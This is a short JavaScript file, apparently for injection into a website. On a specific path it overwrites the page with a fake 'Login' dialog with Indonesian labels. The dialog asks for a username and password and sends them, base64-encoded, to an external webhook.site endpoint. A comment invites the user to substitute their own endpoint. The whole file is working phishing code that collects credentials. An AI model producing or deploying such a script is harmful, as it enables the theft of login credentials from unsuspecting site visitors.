(function () {
  const webhook = "https://webhook.site/2dbd44fb-6f22-4f72-87a1-acb6908dfde1"; // Ganti ke endpoint milikmu

  if (location.pathname !== "/data-inject") return;

  document.documentElement.innerHTML = `
  <style>
    @media (prefers-color-scheme: dark) {
      .phish-box { background: #1c1f26; color: #fff; }
      .phish-input { background: #1c1f26; color: #fff; border-bottom: 2px solid #8ab4f8; }
      .phish-button { color: #8ab4f8; }
    }
    @media (prefers-color-scheme: light) {
      .phish-box { background: #fff; color: #000; }
      .phish-input { background: #fff; color: #000; border-bottom: 2px solid #4285f4; }
      .phish-button { color: #4285f4; }
    }
  </style>
  <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#9e9e9e99;display:flex;justify-content:center;align-items:center;z-index:9999;">
    <div class="phish-box" style="padding:20px 25px;border-radius:16px;width:90%;max-width:400px;box-shadow:0 4px 16px rgba(0,0,0,0.3);font-family:sans-serif;">
      <h2 style="margin-top:0;margin-bottom:10px;">Login</h2>
      <p style="margin:0 0 20px;font-size:14px;">https://admsol.nexxss.site memerlukan nama pengguna dan sandi.</p>
      <form onsubmit="fetch('${webhook}?cred='+btoa(this.user.value+':'+this.pass.value));return false;">
        <label style="display:block;margin-bottom:5px;font-size:12px;">Nama Pengguna</label>
        <input name="user" class="phish-input" style="width:100%;padding:8px 12px;margin-bottom:20px;border:none;outline:none;font-size:16px;" required>
        
        <label style="display:block;margin-bottom:5px;font-size:12px;">Sandi</label>
        <input name="pass" type="password" class="phish-input" style="width:100%;padding:8px 12px;margin-bottom:20px;border:none;outline:none;font-size:16px;" required>
        
        <div style="text-align:right;">
          <button type="button" onclick="this.closest('div[style]').remove()" class="phish-button" style="margin-right:15px;background:none;border:none;font-size:14px;cursor:pointer;">Batal</button>
          <button type="submit" class="phish-button" style="background:none;border:none;font-size:14px;cursor:pointer;">Login</button>
        </div>
      </form>
    </div>
  </div>
  `;
})();
